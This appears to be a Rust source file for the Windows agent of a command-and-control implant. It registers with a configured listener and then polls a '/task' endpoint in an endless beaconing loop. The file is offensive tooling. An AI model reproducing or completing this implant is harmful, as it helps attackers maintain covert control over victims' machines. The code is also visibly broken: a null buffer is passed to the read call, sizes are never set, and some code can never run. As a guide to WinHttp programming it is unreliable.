use std::ffi::c_void;
use std::mem;
use std::thread;
use std::time;
use windows::{
    core::*,
    Win32::{
        Foundation::*,
        Networking::WinHttp::*,
        System::{Com::*, Memory::*, Threading::*},
    }
};

use crate::Config;

trait ToWide {
    fn to_utf16(self) -> Vec<u16>;
}

impl ToWide for &str {
    fn to_utf16(self) -> Vec<u16> {
        self.encode_utf16().chain(Some(0)).collect::<Vec<_>>()
    }
}

// References:
//  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
//  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
pub fn run(config: Config) -> Result<()> {
    let sleep = time::Duration::from_secs(config.sleep);

    // Test request
    request(
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
        "/".to_string(),
        "GET".to_string(),
    );

    thread::sleep(sleep);

    // Register agent
    request(
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
        "/reg".to_string(),
        "POST".to_string(),
    );

    thread::sleep(sleep);

    loop {
        // Check task
        request(
            config.listener.proto.to_string(),
            config.listener.host.to_string(),
            config.listener.port.to_owned(),
            "/task".to_string(),
            "GET".to_string(),
        );

        thread::sleep(sleep);
    }

    Ok(())
}

fn request(proto: String, host: String, port: u16, url_path: String, method: String) {
    unsafe {
        let mut agent = HSTRING::from("test");
    
        let mut host = HSTRING::from(host);
        let mut url_path = HSTRING::from(url_path);
        let mut method = HSTRING::from(method);
    
        let mut h_session: *mut c_void = std::ptr::null_mut();
        let mut h_connect: *mut c_void = std::ptr::null_mut();
        let mut h_request: *mut c_void = std::ptr::null_mut();
        let mut b_results = Ok(());
    
        let mut dw_size: usize = 0;
        let mut dw_downloaded: usize = 0;
        let mut out_buffer = Vec::new();
        let mut psz_out_buffer: *mut c_void = &mut out_buffer as *mut _ as *mut c_void;

        let h_session = WinHttpOpen(
            &agent,
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            &HSTRING::new(),
            &HSTRING::new(),
            WINHTTP_FLAG_ASYNC);

        // WinHttpSetOption(
        //     h_session,
        //     WINHTTP_OPTION_HTTP2_KEEPALIVE,
        //     &15000u32 as *const _ as *const c_void,
        // );

        if h_session.is_null() {
            println!("Error: h_session is null.");
            return;
        }

        h_connect = WinHttpConnect(
            h_session,
            &host,
            port,
            0);

        if h_connect.is_null() {
            println!("Error: h_connect is null.");
            return;
        }

        h_request = WinHttpOpenRequest(
            h_connect,
            &method,
            &url_path,
            PCWSTR::null(),
            PCWSTR::null(),
            std::ptr::null_mut(),
            // WINHTTP_FLAG_SECURE,
            WINHTTP_OPEN_REQUEST_FLAGS(0), // Use this instead of `WINHTTP_FLAG_SECURE` because the request data is buggy when using `WINHTT_FLAG_SECURE`.
        );

        // Add headers
        // WinHttpAddRequestHeaders(
        //     h_request,
        //     &w!("Content-Type: text/plain; charset=utf-8").as_wide(),
        //     WINHTTP_ADDREQ_FLAG_ADD,
        // );

        if h_request.is_null() {
            println!("Error: h_request is null.");
            return;
        }

        b_results = WinHttpSendRequest(
            h_request,
            Some(&[0]),
            Some(std::ptr::null()),
            0,
            0,
            0);

        if b_results.is_ok() {
            b_results = WinHttpReceiveResponse(h_request, std::ptr::null_mut());
        }

        match b_results {
            Ok(_) => {
                loop {
                    dw_size = 0;
    
                    if let Err(e) = WinHttpQueryDataAvailable(h_request, std::ptr::null_mut()) {
                        println!("Error querying data available: {e}");
                    }
    
                    out_buffer = vec![0; dw_size + 1];
                    if psz_out_buffer.is_null() {
                        println!("Out of memory.");
                        break;
                        dw_size = 0;
                    } else {
                        // Read the Data.
                        psz_out_buffer = mem::zeroed();
    
                        let r = WinHttpReadData(
                            h_request,
                            psz_out_buffer,
                            out_buffer.len() as u32,
                            std::ptr::null_mut(),
                        );
    
                        if let Ok(r) = r {
                            println!("OK");
                        } else {
                            println!("Error");
                        }
                        
                        // delete[] pszOutBuffer;
                    }
    
                    if dw_size > 0 {
                        break;
                    }
                }
            }
            Err(e) => {
                println!("Error response: {:#?}", e);
            }
        }
    
        // Close any open handles.
        if !h_request.is_null() {
            WinHttpCloseHandle(h_request);
        }
        if !h_connect.is_null() {
            WinHttpCloseHandle(h_connect);
        }
        if !h_session.is_null() {
            WinHttpCloseHandle(h_session);
        }
    }
}

fn to_utf16(text: &str) -> Vec<u16> {
    text.encode_utf16().chain(Some(0)).collect::<Vec<_>>()
}